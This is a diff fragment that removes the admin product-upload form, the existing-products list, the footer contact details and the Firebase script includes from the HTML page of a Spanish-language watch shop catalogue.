-                                    <label for="new-img-2" class="flex flex-col items-center justify-center w-full h-24 bg-[#131b30] rounded-xl border-2 border-dashed border-yellow-500/30 cursor-pointer hover:border-yellow-400 transition overflow-hidden">
-                                        <div id="new-img-2-placeholder" class="flex flex-col items-center text-gray-400 text-[11px] gap-1 px-1 text-center">
-                                            <i class="fa-solid fa-camera text-base text-yellow-500"></i>
-                                            <span>Foto 2 (Opcional)</span>
-                                        </div>
-                                        <img id="new-img-2-preview" class="hidden w-full h-full object-cover" alt="Vista previa foto 2">
-                                    </label>
-                                    <button type="button" onclick="clearNewImage(2)" id="new-img-2-clear" class="hidden absolute -top-2 -right-2 w-6 h-6 rounded-full bg-rose-500 text-white text-xs flex items-center justify-center shadow">
-                                        <i class="fa-solid fa-xmark"></i>
-                                    </button>
-                                </div>
-                                <div class="relative">
-                                    <input type="file" accept="image/png, image/jpeg" id="new-img-3" onchange="previewNewImage(3, this)" class="hidden">
-                                    <label for="new-img-3" class="flex flex-col items-center justify-center w-full h-24 bg-[#131b30] rounded-xl border-2 border-dashed border-yellow-500/30 cursor-pointer hover:border-yellow-400 transition overflow-hidden">
-                                        <div id="new-img-3-placeholder" class="flex flex-col items-center text-gray-400 text-[11px] gap-1 px-1 text-center">
-                                            <i class="fa-solid fa-camera text-base text-yellow-500"></i>
-                                            <span>Foto 3 (Opcional)</span>
-                                        </div>
-                                        <img id="new-img-3-preview" class="hidden w-full h-full object-cover" alt="Vista previa foto 3">
-                                    </label>
-                                    <button type="button" onclick="clearNewImage(3)" id="new-img-3-clear" class="hidden absolute -top-2 -right-2 w-6 h-6 rounded-full bg-rose-500 text-white text-xs flex items-center justify-center shadow">
-                                        <i class="fa-solid fa-xmark"></i>
-                                    </button>
-                                </div>
-                                <div class="relative">
-                                    <input type="file" accept="image/png, image/jpeg" id="new-img-4" onchange="previewNewImage(4, this)" class="hidden">
-                                    <label for="new-img-4" class="flex flex-col items-center justify-center w-full h-24 bg-[#131b30] rounded-xl border-2 border-dashed border-yellow-500/30 cursor-pointer hover:border-yellow-400 transition overflow-hidden">
-                                        <div id="new-img-4-placeholder" class="flex flex-col items-center text-gray-400 text-[11px] gap-1 px-1 text-center">
-                                            <i class="fa-solid fa-camera text-base text-yellow-500"></i>
-                                            <span>Foto 4 (Opcional)</span>
-                                        </div>
-                                        <img id="new-img-4-preview" class="hidden w-full h-full object-cover" alt="Vista previa foto 4">
-                                    </label>
-                                    <button type="button" onclick="clearNewImage(4)" id="new-img-4-clear" class="hidden absolute -top-2 -right-2 w-6 h-6 rounded-full bg-rose-500 text-white text-xs flex items-center justify-center shadow">
-                                        <i class="fa-solid fa-xmark"></i>
-                                    </button>
-                                </div>
-                            </div>
-                            <p class="text-[11px] text-gray-400">Sube las fotos directamente desde tu computador o celular (PNG o JPG).</p>
-                        </div>
-                        <div class="sm:col-span-2 pt-2">
-                            <button type="submit" id="product-form-submit-btn" class="w-full py-3 bg-gradient-to-r from-yellow-500 to-amber-600 hover:from-yellow-600 hover:to-amber-700 text-black font-bold rounded-xl shadow-md transition duration-300 text-sm flex items-center justify-center gap-2">
-                                <i id="product-form-submit-icon" class="fa-solid fa-cloud-arrow-up"></i> <span id="product-form-submit-text">Guardar Producto en el Catálogo</span>
-                            </button>
-                        </div>
-                    </form>
-                </div>
-
-                <!-- Manage / Delete Existing Products -->
-                <div>
-                    <div class="flex items-center justify-between mb-4">
-                        <h4 class="text-md font-bold text-white flex items-center gap-2">
-                            <i class="fa-solid fa-list-check text-yellow-400"></i> Productos Existentes (<span id="admin-prod-count">0</span>)
-                        </h4>
-                        <button onclick="seedDefaultProductsIfEmpty()" class="text-[11px] text-gray-400 hover:text-yellow-400 underline">
-                            Cargar productos de ejemplo
-                        </button>
-                    </div>
-                    <div id="admin-products-list" class="space-y-3 max-h-80 overflow-y-auto pr-2">
-                        <!-- Rendered via JS -->
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <footer class="bg-[#05070d] border-t border-yellow-500/20 py-8 mt-12 text-center text-xs text-gray-400">
-        <div class="max-w-7xl mx-auto px-4 space-y-2">
-            <p>© 2026 Catálogo Exclusivo de Relojeria G&G</p>
-            <p>Whatsapp 300 597 9420</p>
-            <p>INSTAGRAM: relojeria.gg_</p>
-        </div>
-    </footer>
-
-    <!-- Firebase (base de datos real y compartida del catálogo) -->
-    <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore-compat.js"></script>
-    <script src="firebase-config.js"></script>
-    <script src="script.js"></script>
 </body>
 </html>
